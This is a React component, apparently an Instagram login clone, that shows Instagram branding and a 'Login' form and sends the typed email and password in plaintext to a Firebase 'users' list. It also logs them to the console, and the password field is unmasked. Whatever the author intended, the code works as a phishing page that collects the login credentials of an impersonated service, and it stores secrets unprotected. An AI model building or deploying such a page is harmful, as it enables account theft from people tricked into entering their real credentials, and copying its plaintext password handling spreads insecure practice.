import React, { useState } from "react";
import { database } from "./configration/configer";
import { ref, push } from "firebase/database";
import Swal from "sweetalert2";
import { motion, scale } from "framer-motion";

function Signup() {
  const [data, setData] = useState({
    email: "",
    password: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSummit = async (e) => {
    e.preventDefault();

    try {
      console.log("Submitting data: ", data);
      const dataRef = ref(database, "users");
      await push(dataRef, data);

      Swal.fire({
        title: "Drag me!",
        icon: "success",
        draggable: true,
      });
    } catch (error) {
      console.error("Error submitting data: ", error);
      Swal.fire({
        title: "Error!",
        icon: "error",
        text: "Failed to submit data",
      });
    }
  };

  return (
    <motion.main
    //   initial={{ x: -100 }}
    //   animate={{ x: 0 }}
    //   transition={{ duration: 0.5, type: "spring", stiffness: 150 }}
      className=" flex  justify-around  min-h-screen   items-center  flex-row "
    >
      <motion.div
        initial={{ x: -100 }}
        animate={{ x: 0 }}
        transition={{ duration: 1, type: "spring", stiffness: 150 }}
        className="  justify-center items-center text-center  "
      >
        {" "}
        <h1 className="text-center  text-3xl ">
          see everday moment from <br /> your{" "}
          <span className="bg-gradient-to-r from-[#e78127] via-[#a855f7] to-[#ec4899] bg-clip-text text-transparent">
            close friend{" "}
          </span>
        </h1>
        < motion.img whileHover={{ scale: 1.1 }}  src="src/assets/instamain.webp" width="500" alt="" />
      </motion.div>

      < motion.div initial={{ x: 100 }} animate={{ x: 0 }} transition={{ duration: 0.9, type: "spring", stiffness: 200 }}  className=" flex  flex-column justify-center items-center text-center">
        <form
          className=" flex  gap-6 items-center justify-center  flex-col"
          onSubmit={handleSummit}
        >
          <motion.img
            src="src/assets/insta_logo-removebg-preview.png"
            width={100}
            alt=""
            whileHover={{ scale: 1.1 }} 
          />
          <h1 className="text-center  text-3xl ">
            {" "}
            get the full experience with <br /> The tablet app
          </h1> 

          <input
            className="border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
            type="email"
            placeholder="enter your email"
            name="email"
            onChange={handleChange}
          />

          <input
            className="border border-gray-300 rounded-md py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
            type="text"
            placeholder="enter your password"
            name="password"
            onChange={handleChange}
          />
          <motion.button
            className="  w-full bg-gradient-to-r from-[#e78127] to-[#ec4899] text-white font-bold py-2 px-4 rounded-md hover:from-[#a855f7] hover:to-[#ec4899]"
            type="submit"
            whileHover={{ scale: 1.05 }}
          >
            Login
          </motion.button>
        </form>
      </ motion.div>
    </motion.main>
  );
}

export default Signup;
